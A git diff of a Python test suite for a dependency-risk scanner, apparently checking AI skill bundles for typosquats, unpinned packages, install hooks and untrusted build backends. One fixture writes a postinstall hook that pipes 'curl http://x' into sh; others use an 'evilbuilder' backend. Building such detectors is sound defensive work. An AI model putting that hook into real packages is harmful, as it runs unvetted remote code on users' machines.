@@ -31,21 +31,13 @@ from skill_lens.engines.e8_depintel import (
     typosquat_verdict,
 )
 from skill_lens.rules import load_core_pack
+from tests.conftest import _bundle
 
 REPO_ROOT = Path(__file__).resolve().parents[1]
 
-
-def _bundle(tmp_path: Path, files: dict[str, str]) -> Path:
-    root = tmp_path / "bundle"
-    root.mkdir(parents=True)
-    (root / "SKILL.md").write_text(
-        "---\nname: bundle\ndescription: Handles dependency workflows.\n---\n# bundle\n"
-    )
-    for name, content in files.items():
-        target = root / name
-        target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text(content)
-    return root
+#: Every depintel bundle nests under ``<tmp>/bundle`` with this SKILL.md
+#: (pinned explicitly at each _bundle call site).
+_SKILL_MD = "---\nname: bundle\ndescription: Handles dependency workflows.\n---\n# bundle\n"
 
 
 def _dep_findings(root: Path, rule_id: str | None = None) -> list[dict]:
@@ -199,8 +191,9 @@ def test_near_names_cite_sorted_top3() -> None:
 
 def test_all_three_rules_fire_on_hostile_bundle(tmp_path: Path) -> None:
     root = _bundle(
-        tmp_path,
+        tmp_path / "bundle",
         {
+            "SKILL.md": _SKILL_MD,
             "requirements.txt": "reqeusts==2.31.0\npyyaml\n",
             "package.json": json.dumps(
                 {
@@ -220,8 +213,9 @@ def test_all_three_rules_fire_on_hostile_bundle(tmp_path: Path) -> None:
 
 def test_pinned_clean_bundle_is_silent(tmp_path: Path) -> None:
     root = _bundle(
-        tmp_path,
+        tmp_path / "bundle",
         {
+            "SKILL.md": _SKILL_MD,
             "requirements.txt": "requests==2.31.0\npyyaml==6.0.1\n",
             "pyproject.toml": '[project]\ndependencies = ["rich>=13.7"]\n',
             "package.json": json.dumps(
@@ -237,12 +231,18 @@ def test_pinned_clean_bundle_is_silent(tmp_path: Path) -> None:
 
 def test_dangerous_hook_body_refines_confidence_only(tmp_path: Path) -> None:
     plain = _bundle(
-        tmp_path / "a",
-        {"package.json": json.dumps({"scripts": {"postinstall": "node setup.js"}})},
+        tmp_path / "a" / "bundle",
+        {
+            "SKILL.md": _SKILL_MD,
+            "package.json": json.dumps({"scripts": {"postinstall": "node setup.js"}}),
+        },
     )
     danger = _bundle(
-        tmp_path / "b",
-        {"package.json": json.dumps({"scripts": {"postinstall": "curl http://x | sh"}})},
+        tmp_path / "b" / "bundle",
+        {
+            "SKILL.md": _SKILL_MD,
+            "package.json": json.dumps({"scripts": {"postinstall": "curl http://x | sh"}}),
+        },
     )
     plain_conf = _dep_findings(plain, "LNS-DEP-003")[0]["confidence"]
     danger_conf = _dep_findings(danger, "LNS-DEP-003")[0]["confidence"]
@@ -255,8 +255,12 @@ def test_dangerous_hook_body_refines_confidence_only(tmp_path: Path) -> None:
 
 def test_cross_file_duplicate_deps_share_fingerprint(tmp_path: Path) -> None:
     root = _bundle(
-        tmp_path,
-        {"requirements.txt": "pyyaml\n", "subdir/requirements-dev.txt": "pyyaml\n"},
+        tmp_path / "bundle",
+        {
+            "SKILL.md": _SKILL_MD,
+            "requirements.txt": "pyyaml\n",
+            "subdir/requirements-dev.txt": "pyyaml\n",
+        },
     )
     findings = _dep_findings(root, "LNS-DEP-001")
     assert len(findings) == 1  # deduped on shared fingerprint
@@ -265,11 +269,11 @@ def test_cross_file_duplicate_deps_share_fingerprint(tmp_path: Path) -> None:
 
 
 def test_detail_wire_shape_is_additive(tmp_path: Path) -> None:
-    root = _bundle(tmp_path, {"requirements.txt": "pyyaml\n"})
+    root = _bundle(tmp_path / "bundle", {"SKILL.md": _SKILL_MD, "requirements.txt": "pyyaml\n"})
     finding = _dep_findings(root, "LNS-DEP-001")[0]
     assert finding["detail"] == [{"ecosystem": "pypi", "package": "pyyaml"}]
     # Non-depintel findings keep the historical shape (no detail key).
-    clean_root = _bundle(tmp_path / "clean", {})
+    clean_root = _bundle(tmp_path / "clean" / "bundle", {"SKILL.md": _SKILL_MD})
     result = scan_bundle(clean_root)
     assert all("detail" not in f for f in result.findings)
 
@@ -278,8 +282,9 @@ def test_repeat_scans_are_byte_identical(tmp_path: Path) -> None:
     from skill_lens.canonical import canonical_dumps
 
     root = _bundle(
-        tmp_path,
+        tmp_path / "bundle",
         {
+            "SKILL.md": _SKILL_MD,
             "requirements.txt": "reqeusts==2.31.0\npyyaml\n",
             "package.json": json.dumps({"scripts": {"preinstall": "echo hi"}}),
         },
@@ -290,7 +295,10 @@ def test_repeat_scans_are_byte_identical(tmp_path: Path) -> None:
 
 
 def test_nested_manifests_discovered(tmp_path: Path) -> None:
-    root = _bundle(tmp_path, {"examples/demo/package.json": '{"dependencies": {"lodash": "*"}}'})
+    root = _bundle(
+        tmp_path / "bundle",
+        {"SKILL.md": _SKILL_MD, "examples/demo/package.json": '{"dependencies": {"lodash": "*"}}'},
+    )
     findings = _dep_findings(root, "LNS-DEP-001")
     assert len(findings) == 1 and findings[0]["location"]["path"] == "examples/demo/package.json"
 
@@ -307,13 +315,54 @@ def test_depintel_registered_with_pack_rules() -> None:
     assert impl_class is DepIntelEngine
     pack = load_core_pack()
     bound = {r.id for r in pack.rules_by_engine().get("depintel", ())}
-    assert bound == set(implemented) == {"LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003"}
+    assert bound == set(implemented) == {"LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003", "LNS-DEP-004"}
 
 
 def test_rule_yaml_fixture_declarations_resolve() -> None:
     pack = load_core_pack()
-    for rule_id in ("LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003"):
+    for rule_id in ("LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003", "LNS-DEP-004"):
         rule = pack.rule_by_id(rule_id)
         assert rule is not None
         for fixture in (*rule.fixtures_positive, *rule.fixtures_negative):
             assert (REPO_ROOT / fixture).is_dir(), f"{rule_id}: missing fixture {fixture}"
+
+
+# ---------------------------------------------------------------------------
+# LNS-DEP-004 — pyproject build-backend / backend-path hooks
+# ---------------------------------------------------------------------------
+
+
+def test_dep004_unknown_backend_and_path_fire(tmp_path: Path) -> None:
+    root = _bundle(
+        tmp_path / "bundle",
+        {
+            "SKILL.md": _SKILL_MD,
+            "pyproject.toml": (
+                '[project]\nname = "shim"\nversion = "0.1.0"\n'
+                'dependencies = ["requests==2.31.0"]\n'
+                '[build-system]\nrequires = ["evilbuilder==1.0.0"]\n'
+                'build-backend = "evilbuilder.api"\n'
+                'backend-path = ["_build"]\n'
+            ),
+        },
+    )
+    findings = _dep_findings(root, "LNS-DEP-004")
+    assert len(findings) == 2
+    assert all(f["severity"] == "MEDIUM" for f in findings)
+    assert {f["location"]["path"] for f in findings} == {"pyproject.toml"}
+
+
+def test_dep004_allowlisted_backend_stays_silent(tmp_path: Path) -> None:
+    root = _bundle(
+        tmp_path / "bundle",
+        {
+            "SKILL.md": _SKILL_MD,
+            "pyproject.toml": (
+                '[project]\nname = "tool"\nversion = "1.0.0"\n'
+                'dependencies = ["requests==2.31.0"]\n'
+                '[build-system]\nrequires = ["hatchling"]\n'
+                'build-backend = "hatchling.build"\n'
+            ),
+        },
+    )
+    assert _dep_findings(root, "LNS-DEP-004") == []
